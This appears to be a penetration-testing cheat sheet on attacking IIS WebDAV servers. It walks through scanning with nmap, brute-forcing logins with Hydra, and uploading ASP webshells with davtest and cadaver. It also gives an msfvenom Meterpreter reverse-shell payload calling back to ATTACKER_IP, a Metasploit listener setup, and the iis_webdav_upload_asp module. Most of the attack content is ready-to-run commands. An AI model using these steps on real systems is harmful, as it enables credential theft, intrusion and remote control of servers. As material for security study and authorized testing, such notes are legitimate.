# WebDAV

**It runs on ports 80/443.**

It stands for Web-based Distributed Authoring and Versioning. 

It enables web servers to function as a file server for collaborative authoring.

> IIS supported executable file extensions are: **.asp, .aspx, .config, .php**

WebDAV implements authentication in the form of a username and password.

## Exploitation steps
1. The first step of the exploitation process will involve identifying whether WebDAV has been configured to run on the IIS web server.
2. Perform a brute-force attack on the WebDAV server to identify legitimate credentials that can be used for authentication.
3. Authenticate with the WebDAV server and upload a malicious .asp payload that can be used to execute arbitrary commands or obtain a reverse shell on the target system.


## Tools

### davtest

Davtest is a WebDAV scanner that sends exploit files to the WebDAV server and automatically creates the directory and uploads different format types of files. The tool also tried to execute uploaded files and gives us an output of successfully executed files.

```bash
# davtest check of what type of files can be uploaded
davtest -auth USER:PASS -url http://TARGET_IP/webdav 
```

### cadaver

Cadaver is a tool for WebDAV clients, which supports a command-line style interface. It supports operations such as uploading files, editing, moving, etc.

## WebDAV Exploitation Steps

```bash
# nmap scan
nmap -sS -sV -sC TARGET_IP

# Check if WebDAV is enabled, it looks for /webdav directory
namp -sV -p 80 --script=http-enum TARGET_IP

# Perform brute-fore on the WebDAV service using Hydra
hydra -L USER_LIST -P PASS_LIST TARGET_IP http-get /webdav/

# davtest checks what type of files can be uploaded/executed
davtest -auth USER:PASS -url http://TARGET_IP/webdav 

# Upload shell using cadaver
cadaver http://TARGET_IP/webdav

# Cadaver will ask for credentials if authentication is enabled. Enter credentials and cadaver will display a shell-like view.

# Upload shell to WebDAV using cadaver session
put /usr/share/webshells/asp/webshell.asp

# Navigate to the uploaded webshell
```

## Exploiting WebDAV with Metasploit

```bash
# Generate shell with meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=ATTACKER_PORT -f asp > shell.asp

cadaver http://TARGET_IP/webdav

# Cadaver will ask for credentials if authentication is enabled. Enter credentials and cadaver will display a shell-like view.

# Upload created shell
put shell.asp

# Set up a listener
service postgresql start
msfconsole -q
use multi/handler
set windows/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
set LPORT ATTACKER_PORT
run

# Open the uploaded file shell.asp
```

## Exploiting WebDAV with the Metasploit module `exploit/windows/iis/iis_webdav_upload_asp`

```bash
use module exploit/windows/iis/iis_webdav_upload_asp
set HttpUsername USERNAME
set HttpPassword PASSWORD
set RHOSTS TARGET_IP
set PATH WEBDAV_PATH/shell.asp
set LHOST ATTACKER_IP
set LPORT ATTACKER_PORT
run
```